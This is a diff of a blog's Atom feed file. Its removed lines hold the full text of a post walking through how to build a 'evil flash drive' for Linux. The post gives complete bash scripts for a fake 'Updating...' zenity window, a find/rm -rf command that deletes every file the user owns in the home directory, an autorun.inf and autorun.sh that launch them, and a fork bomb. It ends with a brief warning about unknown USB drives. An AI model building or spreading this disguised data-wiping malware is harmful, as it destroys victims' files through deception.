         &lt;/a&gt;
       &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
-          Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-  &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Recently, the NSA released a free reverse-engineering tool called Ghidra. Today, I decided to take a look at it and try to solve a basic crackme using this tool. This is the link to the crackme that I will be trying to solve today.</summary></entry><entry><title type="html">Basic Evil Flash Drive That Deletes Linux User’s Data</title><link href="http://localhost:4000/2019/01/25/flash-drive-that-deletes-everything.html" rel="alternate" type="text/html" title="Basic Evil Flash Drive That Deletes Linux User's Data" /><published>2019-01-25T00:00:00-05:00</published><updated>2019-01-25T00:00:00-05:00</updated><id>http://localhost:4000/2019/01/25/flash-drive-that-deletes-everything</id><content type="html" xml:base="http://localhost:4000/2019/01/25/flash-drive-that-deletes-everything.html">&lt;p&gt;Today I’m going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a &lt;a href=&quot;https://en.wikipedia.org/wiki/Fork_bomb&quot;&gt;fork bomb&lt;/a&gt; to crash the computer. Since I use Ubuntu as my main operating system, I’m mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.&lt;/p&gt;
-
-&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 25%; height: 25%;&quot; src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updates.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;So lets jump right into it. I had a flash drive that I just reformatted into &lt;a href=&quot;https://en.wikipedia.org/wiki/Ext4&quot;&gt;ext4&lt;/a&gt;. The first thing that I did was create a folder called “updates” in my flash drive, which would be used to hold majority of the code. My next task was to develop the updater pop-up that you see above. This was quite simple to create; all I did was use a program called &lt;a href=&quot;https://en.wikipedia.org/wiki/Zenity&quot;&gt;Zenity&lt;/a&gt; to bring up the updating window. Zenity is a tool used to easily develop these dialog boxes using commands from the terminal. It was already installed by default on my Ubuntu machine, so it was my natural choice to create the dialog box. By running the below command, I was able to develop the window that you see above:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zenity --progress --pulsate --no-cancel --text=&quot;Updating...&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;However, my usage of zenity caused a slight problem. What if this flash drive was going to be put into a system that didn’t have Zenity installed? To solve this problem, I typed in this command to find the location of zenity:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whereis zenity
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And got this output:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zenity: /usr/bin/zenity /usr/share/zenity /usr/share/man/man1/zenity.1.gz
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So, I went ahead and copied the version of zenity located in /usr/bin/zenity to the updates folder located in my flash drive and renamed the program to “updater” so that it was less obvious that it was, in fact, not used for updating your computer. Now my flash drive could run the zenity program directly from the flash drive, which meant that even if this flash drive was put into a computer that did not have zenity installed, it could still run zenity.&lt;/p&gt;
-
-&lt;p&gt;After that, I needed a script that would run zenity from the flash drive, so I made a file called updates.sh inside the updates folder and put this code inside of it:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-./updater &lt;span class=&quot;nt&quot;&gt;--progress&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--pulsate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-cancel&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Updating...&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;All that this code does is cd into the current directory and run zenity (which I renamed to updater) using the flags that create the window that I wanted.&lt;/p&gt;
-
-&lt;p&gt;The next step was to create a bash file that could do actual damage to the system. Inside the updates folder, I made a file called “data.sh”, which would be used to destroy the data. I added this code into the file:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;5
-&lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
-find &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I added the “sleep 5” command so that the user could view the zenity window for five seconds before watching their files be utterly demolished. The next line of code figures out the user’s username, which is needed to run the next command. The find command that comes right after that will find all of the documents that the user owns and deletes them one by one. I didn’t use rm -rf /, which is the usual way that people delete files, because that requires root permissions to delete most of those files, and I wanted to be able to run this without asking the user for root permissions. That is why I instead use the find command to find files that the user owns instead of wasting my time with files that the user does not have permission to delete anyways.&lt;/p&gt;
-
-&lt;p&gt;I also downloaded an icon that looked sort of like an updating computer, and placed that under the updates folder. This icon will eventually be seen on the user’s desktop.&lt;/p&gt;
-
-&lt;p&gt;The next thing I did was to go to the root of the flash drive directory (outside the /updates folder), and create a file called Autorun.inf. This is a special file that will tell the operating system certain information about this particular flash drive. I added these lines of code into this file:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[autorun]
-Open=autorun.sh
-Action=Start Updates
-Label=Updater
-Icon=updates/updater.png
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This tells the operating system to open “autorun.sh” by default when this flash drive is connected, use the label of “Updater,” and use the icon located in the updates folder. It looked something like the image below when I reconnected the flash drive.&lt;/p&gt;
-
-&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 25%; height: 25%;&quot; src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/icon.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finally, I only had one more little step to do. I just had to create an autorun.sh file that would run when the flash drive was inserted. (By default, linux will usually bring up a pop-up asking the user “Would you like to run the software on this flash drive?” for security reasons. Technically this will not be run right when the flash drive is inserted, but only after the user allows it to run. If it was not setup like this by default, then that could cause a huge security hole because a malicious user could insert a flash drive into any computer and run whatever they wanted.) I created an autorun.sh file at the root directory of my flash drive and put this inside it:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;updates
-
-./data.sh | ./updates.sh
-./updater &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Your computer has finished all updates.&quot;&lt;/span&gt;
-
-:&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;:|:&amp;amp;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The first thing that this bash file does is that it changes into the directory of the updates folder. After that, it runs data.sh and updates.sh at the same time (The pipette is used so that when data.sh is done deleting all of the files, updates.sh will also stop as well). After that, it will use zenity to print out a message saying “Your computer has finished all updates.” Then the code ends by delivering the fork bomb.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:() {
-    :|:&amp;amp;
-};
-:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A fork bomb, in case you do not know, is a piece of bash code that will usually result in the computer crashing (although many operating systems today will have some defenses setup), and even if the computer doesn’t crash, it will usually slow it down. When you break down the fork bomb, there are three main parts to it (as shown above). 1.) It defines a function called “:” using “:()”. 2.) It opens the body of the function using the curly bracket. Inside the body of the function, it calls itself using “:|:&amp;amp;”. The “&amp;amp;” is used to run something in the background, and the pipette can be used to run another command in the background, so “:|:&amp;amp;” makes the function call itself twice and background it. Each call to “:” spawns even more calls to “:”, leading to an infinitely recursive process that slowly consumes the system resources. 3.) The program will then close the function using “};”, then it will call the function with the last “:”, which begins this whole process. For your convenience, A better looking version of the fork bomb is below:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foo() {
-    call foo | call foo &amp;amp;
-};
-call foo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This pretty much wraps up this blog post. All I did now was just set all of my bash files to executable using the “chmod +x [file]” command. I ran the evil flash drive inside an Ubuntu virtual machine, and it worked perfectly. Everything in the user’s home directory was demolished, and a pop up saying “Ubuntu experienced a system error” even came up.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/runsoftware.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;First it asked me whether I wanted to run the software (which was the security issue I mentioned earlier).&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updating.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Then it started to show the pulsating update bar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/doneupdating.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Once it was done deleting all of my files (it didn’t take too long, I didn’t have much in my virtual machine), the updates bar was completely filled.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/finishedupdates.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It states that I have completed all of my updates.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/thereaintshit.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see, everything in my home folder is now gone. Also, the fork bomb that I implemented earlier is running in the background, making this virtual machine run a lot slower.&lt;/p&gt;
-
-&lt;p&gt;While this was just a basic program that could easily be built in a few minutes, much more advanced evil USBs have been built. For example, &lt;a href=&quot;https://www.ncsc.gov.uk/content/files/protected_files/guidance_files/The-bad-USB-vulnerability1.pdf&quot;&gt;these guys&lt;/a&gt; were able to create a USB that could impersonate a different USB peripheral without the user noticing. This just goes to show that you should not plug in any USB flash drive unless you know that does not contain any malicious programs. You should especially never plug in a random USB that you found without knowing and trusting its source.&lt;/p&gt;
-
-&lt;section class=&quot;related&quot;&gt;
-  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
-  &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
@@ -1683,11 +1708,5 @@ call foo
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Today I’m going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a fork bomb to crash the computer. Since I use Ubuntu as my main operating system, I’m mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.</summary></entry></feed>
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Recently, the NSA released a free reverse-engineering tool called Ghidra. Today, I decided to take a look at it and try to solve a basic crackme using this tool. This is the link to the crackme that I will be trying to solve today.</summary></entry></feed>
